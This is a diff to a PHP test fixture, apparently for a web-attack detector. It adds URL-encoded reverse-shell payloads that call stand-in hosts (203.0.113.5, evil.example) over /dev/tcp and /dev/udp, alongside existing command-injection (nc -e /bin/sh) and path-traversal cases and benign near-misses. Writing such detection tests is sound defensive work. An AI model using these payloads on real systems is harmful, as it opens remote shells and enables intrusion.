@@ -127,6 +127,9 @@ return [
             ['/?cmd=$(id)', [], 'ATK-SHELL'],
             ['/?cmd=x;uname+-a%20%7C%20nc+-e+/bin/sh', [], 'ATK-SHELL'],
             ['/?cmd=/bin/sh+-c+id', [], 'ATK-SHELL'],
+            ['/?cmd=bash+-i+%3E%26+/dev/tcp/203.0.113.5/4444+0%3E%261', [], 'ATK-SHELL'],      // a reverse shell: bash -i >& /dev/tcp/host/port
+            ['/?ip=x%0Aexec+5%3C%3E/dev/tcp/203.0.113.5/80', [], 'ATK-SHELL'],
+            ['/?h=sh+-i+%3E%26+/dev/udp/evil.example/53+0%3E%261', [], 'ATK-SHELL'],
             // file inclusion
             ['/?f=../../secret.txt', [], 'ATK-LFI'],
             ['/?f=..%5c..%5cwin.ini', [], 'ATK-LFI'],
@@ -266,6 +269,8 @@ return [
             '/?q=x%20%3C%20y%20formaction%3D1',      // "x < y": no tag
             '/?q=formaction%3Dsave',                 // the word without a tag
             '/?q=%3Cb%3Eformaction%3D%3C/b%3E',      // the tag closed before it
+            '/?q=bash%20/dev/tcp%20tutorial',        // the device named, no host and port
+            '/?f=/dev/tcpdump/1',                    // another word
             '/?d=a:1:{i:0;s:1:"x";}',                // a serialised array: no object in it
             '/?t=10:30:00&o=1',                      // times, a parameter called o
             '/fetch?url=https://www.example.org/feed',   // an ordinary address
